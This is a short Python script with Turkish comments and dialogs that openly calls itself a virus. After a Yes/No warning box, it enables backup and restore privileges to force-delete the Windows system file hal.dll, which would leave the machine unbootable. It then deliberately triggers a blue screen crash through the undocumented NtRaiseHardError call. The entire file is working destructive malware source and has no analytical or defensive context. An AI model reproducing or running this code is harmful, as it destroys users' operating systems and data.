import ctypes
import sys
import time
from tkinter import messagebox
import os
import win32security
import ntsecuritycon as con
import win32file

def trigger_blue_screen():
    try:
        # Windows API çağrısı ile mavi ekran tetikleme
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, None)
        ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, 0)
    except Exception:
        sys.exit()

def force_delete_file(file_path):
    try:
        # Yönetici hakları alma
        hToken = win32security.OpenProcessToken(
            win32security.GetCurrentProcess(), 
            win32security.TOKEN_ALL_ACCESS
        )
        
        # Ayrıcalık yükseltme
        win32security.AdjustTokenPrivileges(
            hToken,
            False,
            [(win32security.LookupPrivilegeValue(None, "SeBackupPrivilege"), con.SE_PRIVILEGE_ENABLED),
             (win32security.LookupPrivilegeValue(None, "SeRestorePrivilege"), con.SE_PRIVILEGE_ENABLED)]
        )
        
        # Dosyayı zorla silme
        win32file.DeleteFile(file_path)
        
    except Exception as e:
        print(f"Sistem silinemedi: {e}")

if messagebox.askyesno("UYARI!", "Bu virüs çok tehlikeli olabilir. Başlatmak istediğinizden emin misiniz?"):
    force_delete_file(r"C:\\Windows\\System32\\hal.dll")
    time.sleep(2)
    trigger_blue_screen()
else:
    sys.exit()
